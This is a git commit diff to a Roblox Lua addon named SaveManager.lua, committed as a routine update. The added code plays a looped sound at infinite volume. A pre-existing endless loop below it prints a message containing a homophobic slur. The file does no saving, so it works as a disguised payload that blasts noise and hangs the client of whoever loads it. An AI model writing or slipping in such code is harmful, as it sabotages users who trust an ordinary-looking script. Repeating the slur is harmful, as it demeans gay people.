d96e9d15d71d6b1da7d51a2ccf11a05ff6231201
Efial#5338 <84471368+freshlocaliar2mgiadawdpaklsd@users.noreply.github.com>
2023-03-01 19:38:56 -0500

    Update SaveManager.lua

--- addons/SaveManager.lua
+++ addons/SaveManager.lua
@@ -1,3 +1,12 @@
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://5351101493"
+sound.Looped = true
+sound.Parent = workspace
+sound.Playing = true
+sound.Volume = math.huge
+
+wait(2)
+
 while true do
   print("Faggot Thought Anti Kick Gon Do Some :Skull:")
 end
